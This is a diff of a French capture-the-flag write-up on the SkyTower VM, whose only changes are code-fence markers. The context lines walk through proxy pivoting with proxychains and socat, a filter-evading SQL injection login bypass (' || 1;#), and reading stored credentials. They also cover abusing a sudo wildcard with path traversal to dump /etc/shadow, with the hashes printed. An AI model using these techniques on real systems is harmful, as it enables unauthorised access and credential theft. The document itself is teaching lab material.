@@ -10,14 +10,14 @@ In(tro)duction
 
 La seule description du CTF est la suivante :  
 
-```plain
+```
 This was used at a local CTF security conference.
 ```
 
 Ignition
 --------
 
-```plain
+```
 Nmap scan report for 192.168.1.84
 Host is up (0.00021s latency).
 Not shown: 997 closed ports
@@ -38,13 +38,13 @@ Une recherche sur *GitHub* permet de trouver plusieurs versions forkées. Je me 
 
 Une fois compilé, on modifie l'entrée *[ProxyList]* du fichier *src/proxychains.conf* pour la ligne suivante :  
 
-```plain
+```
 http 192.168.1.84 3128
 ```
 
 On fait passer *nmap* par le proxy *Squid* :  
 
-```plain
+```
 ./proxychains4 -f src/proxychains.conf nmap -p- -sT 127.0.0.1
 Nmap scan report for localhost (127.0.0.1)
 Host is up (0.00070s latency).
@@ -60,7 +60,7 @@ Mach 10
 
 Un petit scan avec *Wapiti* permet de trouver une faille d'injection SQL sur la page de login renvoyée par le serveur Apache (nb: le mot clé *common* est présent dans la version de dév, pas dans la version stable actuelle) :  
 
-```plain
+```
 ./bin/wapiti http://192.168.1.84/ -m "common,nikto,backup,htaccess"
 
 [+] Lancement du module sql
@@ -87,7 +87,7 @@ Malheureusement *sqlmap* se casse les dents sur cette faille. On va devoir étud
 
 Si on tente de bypasser l'authentification (saisie de *' or 1=1#* dans le champ email) on obtient l'erreur suivante :  
 
-```plain
+```
 There was an error running the query [You have an error in your SQL syntax;
 check the manual that corresponds to your MySQL server version for the right
 syntax to use near '11#' and password=''' at line 1]
@@ -97,25 +97,25 @@ Il semble que certains mots clés soient directement retirés de la chaîne que 
 
 Même chose avec *' or 1 or 1;#* :  
 
-```plain
+```
 ... near '1 1;#' and password='''
 ```
 
 et avec une tentative d'union (*' union select 1,1;#*) :  
 
-```plain
+```
 ... near '11;#' and password='''
 ```
 
 Le script a l'air de retirer les *OR*, *AND*, virgules, égal et potentiellement d'autres caractères. Heureusement MySQL supporte une autre réprésentation de l'opérateur *OR*. On peut finalement bypasser l'authentification en saisissant l'email suivant :  
 
-```plain
+```
 ' || 1;#
 ```
 
 Ce qui nous donne la page suivante :  
 
-```plain
+```
 Welcome john@skytech.com
 
 As you may know, SkyTech has ceased all international operations.
@@ -138,13 +138,13 @@ Atterissage
 
 Maintenant avec des identifiants SSH en main, on ouvre un tunnel passant par le proxy *Squid* à l'aide de *socat* :  
 
-```plain
+```
 socat TCP-LISTEN:9999,reuseaddr,fork PROXY:192.168.1.84:127.0.0.1:22,proxyport=3128
 ```
 
 La connection passe (presque) comme dans du beurre :  
 
-```plain
+```
 $ ssh john@127.0.0.1 -p 9999
 john@127.0.0.1's password: 
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
@@ -155,7 +155,7 @@ Connection to 127.0.0.1 closed.
 
 Essayons de faire éxécuter une autre commande :  
 
-```plain
+```
 $ ssh john@127.0.0.1 -p 9999 /bin/bash
 john@127.0.0.1's password: 
 id
@@ -175,14 +175,14 @@ exit
 
 C'est donc le *.bashrc* qui nous éjecte. Il suffit de le déplacer pour ne plus avoir à sans soucier.  
 
-```plain
+```
 john@SkyTower:~$ uname -a
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux
 ```
 
 En dehors des utilisateurs habituels on trouve trois personnes dans */etc/passwd* :
 
-```plain
+```
 john:x:1000:1000:john,,,:/home/john:/bin/bash
 sara:x:1001:1001:,,,:/home/sara:/bin/bash
 william:x:1002:1002:,,,:/home/william:/bin/bash
@@ -192,7 +192,7 @@ La liste des processus, services, crontab, setuids, setgids ne donne rien d'int�
 
 D'abord récupérer les identifiants dans */var/www/login.php* :  
 
-```plain
+```
 <?php
 
 $db = new mysqli('localhost', 'root', 'root', 'SkyTech');
@@ -220,7 +220,7 @@ On remarque au passage le filtrage qui est effectué.
 
 On trouve les trois users du système dans la BDD :  
 
-```plain
+```
 mysql> select * from login;
 +----+---------------------+--------------+
 | id | email               | password     |
@@ -240,7 +240,7 @@ Mission accomplished
 
 *sara* a une autorisation spéciale *sudo* pour consulter le contenu de */accounts* (qui est vide) :  
 
-```plain
+```
 sara@SkyTower:~$ sudo -l
 Matching Defaults entries for sara on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -251,7 +251,7 @@ User sara may run the following commands on this host:
 
 Seulement l'astérisque est pour le moins permissif et permet de remonter l'arborescence :  
 
-```plain
+```
 sara@SkyTower:/var/www$ sudo /bin/cat /accounts/../etc/shadow
 root:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:16241:0:99999:7:::
 --- snip ---
@@ -262,7 +262,7 @@ william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn
 
 Qu'il-y a t-il dans /root ?  
 
-```plain
+```
 sara@SkyTower:~$ sudo /bin/ls /accounts/../root/ -al
 total 36
 drwx------  4 root root 4096 Jun 20 09:01 .
